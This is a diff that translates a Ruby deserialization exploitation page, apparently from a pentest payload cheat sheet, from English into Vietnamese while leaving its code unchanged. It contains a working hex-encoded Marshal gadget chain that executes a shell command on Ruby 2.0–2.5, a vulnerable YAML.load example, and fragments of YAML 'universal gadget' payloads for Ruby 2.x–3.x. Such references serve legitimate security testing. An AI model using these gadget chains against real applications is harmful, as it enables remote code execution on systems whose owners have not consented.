@@ -1,16 +1,16 @@
 # Ruby Deserialization
 
-> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.
+> Deserialization trong Ruby là quá trình chuyển đổi dữ liệu đã được serialize trở lại thành các object Ruby, thường sử dụng các định dạng như YAML, Marshal hoặc JSON. Chẳng hạn, module `Marshal` của Ruby thường được sử dụng cho mục đích này vì nó có thể serialize và deserialize các Ruby object phức tạp.
 
-## Summary
+## Tóm tắt
 
 * [Marshal Deserialization](#marshal-deserialization)
 * [YAML Deserialization](#yaml-deserialization)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
 ## Marshal Deserialization
 
-Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
+Script dùng để tạo và xác minh chuỗi gadget deserialization trên Ruby từ phiên bản 2.0 đến 2.5.
 
 ```ruby
 for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
@@ -18,14 +18,14 @@ for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1
 
 ## YAML Deserialization
 
-Vulnerable code
+### Code dễ bị tấn công
 
 ```ruby
 require "yaml"
 YAML.load(File.read("p.yml"))
 ```
 
-Universal gadget for ruby <= 2.7.2:
+### Universal gadget cho Ruby <= 2.7.2
 
 ```yaml
 --- !ruby/object:Gem::Requirement
@@ -39,7 +39,7 @@ requirements:
       spec:
 ```
 
-Universal gadget for ruby 2.x - 3.x.
+### Universal gadget cho Ruby 2.x - 3.x
 
 ```yaml
 ---
@@ -85,7 +85,7 @@ Universal gadget for ruby 2.x - 3.x.
           method_id: :resolve 
 ```
 
-## References
+## Tài liệu tham khảo
 
 * [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://web.archive.org/web/20210610111705/https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
 * [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://web.archive.org/web/20191128020715/https://www.elttam.com.au/blog/ruby-deserialization/)
